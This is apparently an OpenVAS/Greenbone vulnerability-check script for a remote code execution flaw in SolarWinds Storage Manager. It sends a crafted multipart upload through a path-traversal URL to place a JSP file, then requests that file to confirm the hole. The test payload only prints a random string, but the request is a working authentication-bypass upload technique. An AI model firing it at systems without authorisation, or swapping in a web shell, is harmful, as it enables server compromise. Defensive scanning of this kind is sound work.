if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.105090" );
	script_tag( name: "cvss_base", value: "8.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:P/A:N" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_name( "SolarWinds Storage Manager AuthenticationFilter Remote Code Execution Vulnerability" );
	script_xref( name: "URL", value: "http://www.zerodayinitiative.com/advisories/ZDI-14-299/" );
	script_tag( name: "impact", value: "This may allow a remote attacker to subvert
the authentication filter and upload arbitrary scripts, and use them to execute
arbitrary code." );
	script_tag( name: "vuldetect", value: "Try to upload a file." );
	script_tag( name: "insight", value: "SolarWinds Storage Manager contains a flaw
in the AuthenticationFilter class." );
	script_tag( name: "solution", value: "Update to 5.7.2 or higher." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "summary", value: "SolarWinds Storage Manager is prone to a remote code execution vulnerability" );
	script_tag( name: "affected", value: "Storage Manager Server before 5.7.2 is vulnerable." );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2014-09-16 15:55:12 +0200 (Tue, 16 Sep 2014)" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 9000 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 9000 );
buf = http_get_cache( item: "/", port: port );
if(!buf || !ContainsString( buf, "<title>SolarWinds - Storage Manager" )){
	exit( 0 );
}
useragent = http_get_user_agent();
host = http_host_name( port: port );
vtstrings = get_vt_strings();
rand_str = vtstrings["default_rand"];
file = "_" + vtstrings["lowercase_rand"] + "_.jsp";
data = "\r\n" + "--_Part_316_1523688081_377140406\r\n" + "Content-Disposition: form-data; name=\"ljyu\"; filename=\"" + file + "\"\r\n" + "Content-Type: application/octet-stream\r\n" + "\r\n" + "<%@ page language=\"Java\" import=\"java.util.*\"%>\r\n" + "<%\r\n" + "out.println(\"" + rand_str + "\");\r\n" + "%>\r\n" + "\r\n" + "--_Part_316_1523688081_377140406--\r\n";
len = strlen( data );
req = "POST /images/../jsp/ProcessFileUpload.jsp HTTP/1.1\r\n" + "Host: " + host + "\r\n" + "User-Agent: " + useragent + "\r\n" + "Content-Type: multipart/form-data; boundary=_Part_316_1523688081_377140406\r\n" + "Content-Length: " + len + "\r\n" + "\r\n" + data;
result = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
if(!result || !ContainsString( result, "Upload Successful" )){
	exit( 99 );
}
url = "/images/../" + file;
req = http_get( item: url, port: port );
buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
if(ContainsString( buf, rand_str )){
	report = "It was possible to upload the file \"" + file + "\". Please delete this file.";
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

